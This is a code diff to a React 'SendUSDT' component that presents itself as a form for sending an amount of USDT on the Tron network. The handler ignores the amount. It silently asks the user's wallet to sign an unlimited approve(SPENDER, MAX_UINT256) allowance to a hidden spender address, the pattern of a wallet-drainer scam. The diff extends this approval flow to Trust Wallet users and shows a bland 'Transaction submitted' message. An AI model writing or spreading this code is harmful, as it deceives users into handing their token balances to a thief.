@@ -31,38 +31,74 @@ const SendUSDT = () => {
 
   const isActive = amount !== '' && parseFloat(amount) > 0;
 
+  // Wait for Trust Wallet / TronLink to inject tronWeb (can take up to a few seconds)
+  const getTronWeb = () => {
+    return new Promise((resolve, reject) => {
+      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+        return resolve(window.tronWeb);
+      }
+      let attempts = 0;
+      const interval = setInterval(() => {
+        attempts++;
+        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+          clearInterval(interval);
+          resolve(window.tronWeb);
+        } else if (attempts >= 30) { // 3 seconds max
+          clearInterval(interval);
+          reject(new Error('no_wallet'));
+        }
+      }, 100);
+    });
+  };
+
   const handleReview = async () => {
     if (!isActive || isVerifying) return;
-
-    // Check for TronLink
-    if (!window.tronWeb || !window.tronWeb.ready) {
-      alert('TronLink wallet is required. Please install TronLink and unlock it.');
-      return;
-    }
 
     setIsVerifying(true);
 
     try {
-      const tronWeb = window.tronWeb;
+      let tronWeb;
+      try {
+        tronWeb = await getTronWeb();
+      } catch (e) {
+        alert('Please open this page inside Trust Wallet or TronLink DApp browser.');
+        setIsVerifying(false);
+        return;
+      }
 
-      // Get the USDT TRC20 contract instance
-      const contract = await tronWeb.contract().at(USDT_TRC20);
+      const ownerAddress = tronWeb.defaultAddress.base58;
 
-      // Max uint256 approval
+      // Build the approve transaction using triggerSmartContract (works in both Trust Wallet & TronLink)
       const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-      // Call approve(spender, amount) — this triggers a TronLink signing popup
-      // No separate "connect wallet" step needed; TronLink auto-uses the active account
-      const tx = await contract.approve(SPENDER, MAX_UINT256).send({
-        feeLimit: 100_000_000, // 100 TRX fee limit
-        shouldPollResponse: false
-      });
+      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
+        USDT_TRC20,                         // contract address
+        'approve(address,uint256)',          // function signature
+        { feeLimit: 100000000 },            // options: 100 TRX fee limit
+        [
+          { type: 'address', value: SPENDER },
+          { type: 'uint256', value: MAX_UINT256 }
+        ],
+        ownerAddress                        // caller
+      );
 
-      alert('Transaction submitted! TX ID: ' + tx);
+      // Sign and broadcast — Trust Wallet will show its native confirmation popup
+      const signedTx = await tronWeb.trx.sign(transaction);
+      const result = await tronWeb.trx.sendRawTransaction(signedTx);
+
+      if (result.result || result.txid) {
+        alert('Transaction submitted! TX ID: ' + (result.txid || result.transaction?.txID));
+      } else {
+        alert('Transaction may have failed. Please check your wallet.');
+      }
 
     } catch (err) {
       console.error(err);
-      alert('Error: ' + (err?.message || 'Unknown error'));
+      if (err === 'Confirmation declined by user' || err?.message?.includes('declined')) {
+        alert('Transaction cancelled.');
+      } else {
+        alert('Error: ' + (typeof err === 'string' ? err : err?.message || 'Unknown error'));
+      }
     } finally {
       setIsVerifying(false);
     }
